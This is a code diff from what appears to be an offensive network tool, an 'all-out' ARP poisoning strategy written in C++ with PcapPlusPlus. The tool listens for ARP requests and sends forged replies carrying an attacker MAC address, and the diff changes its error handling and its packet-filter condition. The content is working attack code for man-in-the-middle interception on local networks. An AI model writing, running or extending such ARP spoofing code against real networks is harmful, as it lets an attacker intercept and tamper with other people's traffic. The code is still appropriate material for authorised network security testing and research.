@@ -6,29 +6,29 @@
 #include "PcapLiveDevice.h"
 #include "RawPacket.h"
 #include "log.h"
+#include <exception>
 #include <future>
 #include <stdexcept>
 
 void ATK::ARP::AllOutArpPoisoningStrategy::onPacketArrives(
-    pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device, void * /*cookie*/) {
-    // currently unused, no termination condition
-    // auto *completionFuture = static_cast<std::promise<void> *>(cookie);
+    pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device, void *cookie) {
+    auto *completionFuture = static_cast<std::promise<void> *>(cookie);
 
     pcpp::Packet parsedPacket(packet);
     auto *requestEthLayer = parsedPacket.getLayerOfType<pcpp::EthLayer>();
     auto *requestArpLayer = parsedPacket.getLayerOfType<pcpp::ArpLayer>();
 
     if (requestEthLayer == nullptr || requestArpLayer == nullptr) {
-        LOG_ERROR(
-            "Invalid filter configuration, foudn packet with missing layers");
-        throw std::runtime_error(
-            "Invalid filter configuration, found packet with missing layers");
+        completionFuture->set_exception_at_thread_exit(std::make_exception_ptr(
+            std::runtime_error("Invalid filter configuration, found packet "
+                               "with missing layers")));
+        device->stopCapture();
     }
 
     // determine whether or not to handle packet
     if ((requestEthLayer->getSourceMac() == device->getMacAddress() ||
          requestEthLayer->getSourceMac() == attackerMac_) ||
-        requestArpLayer->getTargetIpAddr() != device->getIPv4Address()) {
+        requestArpLayer->getTargetIpAddr() == device->getIPv4Address()) {
         LOG_INFO("skipped packet");
         return;
     }
@@ -48,8 +48,10 @@ void ATK::ARP::AllOutArpPoisoningStrategy::onPacketArrives(
     responsePacket.computeCalculateFields();
 
     if (!device->sendPacket(&responsePacket)) {
-        LOG_ERROR("Failed to send packet");
-        throw std::runtime_error("Failed to send packet");
+        device->stopCapture();
+        completionFuture->set_exception_at_thread_exit(std::make_exception_ptr(
+            std::runtime_error("Failed to send packet")));
+        device->stopCapture();
     };
 }
 
@@ -78,10 +80,16 @@ void ATK::ARP::AllOutArpPoisoningStrategy::execute() {
                    void *cookie) { onPacketArrives(packet, device, cookie); },
             &completionFuture)) {
         device_->close();
-
         LOG_ERROR("Unable to start capturing arp packets");
         throw std::runtime_error("Unable to start capturing arp packets");
     };
+
+    try {
+
+        completionFuture.get();
+    } catch (const std::exception &e) {
+        device_->close();
+    }
 
     device_->close();
 }
